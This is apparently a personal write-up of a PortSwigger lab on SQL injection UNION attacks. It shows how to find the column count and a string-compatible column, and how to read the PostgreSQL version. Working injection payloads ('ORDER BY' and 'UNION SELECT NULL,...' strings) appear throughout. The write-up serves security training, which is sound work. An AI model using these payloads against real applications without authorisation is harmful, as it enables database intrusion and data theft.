# SQL injection UNION attack, finding a column containing text

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text), you'll learn: SQL injection UNION attack, finding a column containing text! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204015431.png)

- **Objective: Retrieve the string `F46d4g` from the database.**

In the previous lab, we found **a SQL injection vulnerability in the `filter` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204015820.png)

**And we found the number of columns is 3 via this payload: `' ORDER BY 3-- -`.**

Now, we need to output the string `F46d4g`.

**To do so, I'll find which column is accepting string datatype:**
```sql
' UNION SELECT NULL,NULL,'a'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204020257.png)

**If the datatype doesn't allow strings, it returns a `500 Internal Server Error` HTTP status.**

**If the datatype accept strings:**
```sql
' UNION SELECT NULL,'SQL Injection',NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204020424.png)

**It has no error!**

**After finding the correct column that accepts string datatype, we can use that column to display anything!**
```sql
' UNION SELECT NULL,'F46d4g',NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204020627.png)

**Now, not only we can display what string we want, but also we can enumerate the database much further! Or even exfiltrating data!**

**Finding which version of this database is using:**
```sql
' UNION SELECT NULL,version(),NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-3/images/Pasted%20image%2020221204021005.png)

**We found that it's using `PostgreSQL` for DBMS (Database Management System), and it's version is `12.12`!**

# Conclusion

What we've learned:

1. SQL injection UNION attack, finding a column containing text